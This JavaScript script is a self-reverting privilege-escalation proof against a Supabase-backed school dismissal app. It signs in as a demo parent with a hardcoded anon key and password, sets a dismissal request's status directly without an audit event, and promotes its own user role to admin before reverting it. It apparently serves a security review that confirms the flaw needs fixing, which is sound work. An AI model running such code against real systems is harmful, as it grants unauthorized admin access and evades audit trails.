// Phase 14 — privilege/authority escalation proof (safe, self-reverting).
// Proves a parent client (anon-key JWT) can directly mutate server-owned
// columns that the contract says only Edge Functions/RPCs may touch:
//   (A) set dismissal_requests.status directly (bypasses gate+teacher+audit)
//   (B) escalate public.users.role to 'admin' (bypass authorization)
// The role change is reverted in a finally block so no demo account is harmed.
import { createClient } from "@supabase/supabase-js";

const URL = "https://dmxqqvlnbwzkqfceyuot.supabase.co";
const ANON =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRteHFxdmxuYnd6a3FmY2V5dW90Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODc3OTk1MzUsImV4cCI6MjEwMzM3NTUzNX0.osCtD4y-u2-pmBWb3JZUMhPGalkKM5GiOcrc0ru825U";
const mk = () =>
  createClient(URL, ANON, { auth: { persistSession: false, autoRefreshToken: false } });

const out = [];
const check = (name, ok, detail) => {
  out.push(`${ok ? "PASS-PROOF" : "FAIL-PROOF"} ${name} — ${detail}`);
  console.log(`  [${ok ? "PROOF" : "NO"}] ${name} — ${detail}`);
};

const parent = mk();
await parent.auth.signInWithPassword({ email: "041@demo.dismissflow", password: "041" });
const myId = (await parent.auth.getUser()).data.user.id;

// (A) Create via the trusted RPC (normal path) so we own a request.
const { data: created } = await parent.functions.invoke("create-dismissal-request", { method: "POST", body: {} });
const reqId = created?.request_id;
check("setup: parent request created", !!reqId, `req=${reqId ?? "none"}`);

// (A) Now bypass the workflow: directly set status to DISMISSED as the client.
const { error: updErr, count } = await parent
  .from("dismissal_requests")
  .update({ status: "DISMISSED" })
  .eq("request_id", reqId);
const { data: after } = await parent
  .from("dismissal_requests")
  .select("status")
  .eq("request_id", reqId)
  .maybeSingle();
check(
  "A: client set dismissal_requests.status directly (bypass)",
  !updErr && after?.status === "DISMISSED",
  `count=${count} status=${after?.status} err=${updErr?.message ?? "none"}`
);
// No audit event should exist for a client-side status flip.
const { data: ev } = await parent
  .from("dismissal_events")
  .select("request_id")
  .eq("request_id", reqId)
  .maybeSingle();
check("A: client status flip created NO audit event", !ev, `event=${ev ? "present" : "absent"}`);

// (B) Escalate own role to admin — capture original first, revert in finally.
const { data: before } = await parent.from("users").select("role").eq("user_id", myId).maybeSingle();
const originalRole = before?.role;
const { error: roleErr } = await parent.from("users").update({ role: "admin" }).eq("user_id", myId);
let escalated = false;
try {
  const { data: now } = await parent.from("users").select("role").eq("user_id", myId).maybeSingle();
  escalated = now?.role === "admin";
  check("B: client escalated public.users.role to admin", escalated, `role=${now?.role} err=${roleErr?.message ?? "none"}`);
} finally {
  // Always revert so the demo account is restored.
  await parent.from("users").update({ role: originalRole }).eq("user_id", myId);
  const { data: back } = await parent.from("users").select("role").eq("user_id", myId).maybeSingle();
  check("B: role reverted (no demo account harmed)", back?.role === originalRole, `role=${back?.role}`);
}

console.log("\n=== PHASE 14 PRIVESC PROOF ===");
out.forEach((l) => console.log("  " + l));
console.log(`PHASE14_TEMP_REQUEST_IDS=${reqId ?? ""}`);
const bypassConfirmed = out.some((l) => l.startsWith("PASS-PROOF A")) && out.some((l) => l.startsWith("PASS-PROOF B"));
console.log(bypassConfirmed ? "EXPLOITABLE: YES (fix required)" : "EXPLOITABLE: NO");
process.exit(0);
